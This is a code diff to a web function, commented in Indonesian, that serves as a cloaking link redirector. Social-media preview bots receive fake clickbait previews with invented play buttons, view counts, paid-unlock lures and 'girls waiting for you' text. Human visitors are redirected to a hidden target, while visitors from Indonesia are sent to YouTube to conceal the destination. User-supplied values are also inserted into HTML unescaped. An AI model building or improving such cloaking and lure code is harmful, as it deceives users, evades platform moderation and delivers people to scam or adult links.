@@ -2,6 +2,9 @@ export async function onRequest(context) {
     const { params, request } = context;
     const base64Data = params.path[0];
     const userAgent = request.headers.get("user-agent") || "";
+    
+    // Deteksi Negara (Fitur bawaan Cloudflare)
+    const country = request.cf ? request.cf.country : "Unknown";
 
     if (!base64Data || base64Data === "index.html") {
         return context.next();
@@ -9,41 +12,56 @@ export async function onRequest(context) {
 
     try {
         const data = JSON.parse(atob(base64Data));
-        const title = data.t || "Hot Video";
+        const title = data.t || "Premium Content";
         const image = data.i || "";
         const target = data.u || "";
 
-        // Logic Random Deskripsi
-        const count = Math.floor(Math.random() * 90001) + 10000;
-        const randomDesc = `${count.toLocaleString()} girls waiting for you`;
-
-        // Deteksi Bot Crawler (WhatsApp, FB, dll)
+        const count = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
+        const formattedCount = count.toLocaleString('en-US');
+        
+        const themes = [
+            { t: `▶️ [PLAY] ${title}`, d: `🎬 Full Video (04:22) - ${formattedCount} views`, type: "video.other" },
+            { t: `💰 [PAID] ${title}`, d: `💳 Unlock Content: $5.00 - Access for ${formattedCount} members`, type: "website" },
+            { t: `💎 [VIP] ${title}`, d: `🔓 Exclusive access for ${formattedCount} girls waiting for you`, type: "website" },
+            { t: `🔴 [LIVE] ${title}`, d: `👥 ${formattedCount} people are watching this live now!`, type: "video.other" },
+            { t: `📥 [DOWNLOAD] ${title}`, d: `💾 File Size: 14.5 MB - ${formattedCount} total downloads`, type: "website" }
+        ];
+        
+        const s = themes[Math.floor(Math.random() * themes.length)];
         const isBot = /WhatsApp|facebookexternalhit|TelegramBot|Twitterbot|Slackbot/i.test(userAgent);
 
+        // 1. Tampilan untuk Bot (Agar Preview Muncul)
         if (isBot) {
-            // Trik Tombol Play: Menggunakan og:type video dan memberikan durasi palsu
-            const html = `<!DOCTYPE html>
+            return new Response(`<!DOCTYPE html>
             <html>
             <head>
                 <meta charset="UTF-8">
-                <title>${title}</title>
-                <meta property="og:title" content="${title}" />
-                <meta property="og:description" content="▶️ ${randomDesc}" />
+                <title>${s.t}</title>
+                <meta property="og:title" content="${s.t}" />
+                <meta property="og:description" content="${s.d}" />
                 <meta property="og:image" content="${image}" />
-                <meta property="og:type" content="video.other" />
+                <meta property="og:type" content="${s.type}" />
                 <meta property="og:video:url" content="${image}" /> 
                 <meta property="og:video:type" content="text/html" />
-                <meta property="og:video:width" content="1280" />
-                <meta property="og:video:height" content="720" />
                 <meta name="twitter:card" content="summary_large_image">
             </head>
             <body></body>
-            </html>`;
-            return new Response(html, { headers: { "content-type": "text/html;charset=UTF-8" } });
+            </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
         }
 
-        // Jika manusia, langsung lempar ke target
-        const finalTarget = target.startsWith('http') ? target : 'https://' + target;
+        // 2. LOGIC REDIRECT BERDASARKAN NEGARA
+        let finalTarget = target.trim();
+        
+        // Jika pengunjung dari INDONESIA (ID), arahkan ke YouTube
+        if (country === "ID") {
+            finalTarget = "https://www.youtube.com"; 
+        } else {
+            // Jika luar Indonesia, arahkan ke target asli
+            if (!/^https?:\/\//i.test(finalTarget)) {
+                finalTarget = 'https://' + finalTarget;
+            }
+        }
+
         return Response.redirect(finalTarget, 302);
 
     } catch (e) {
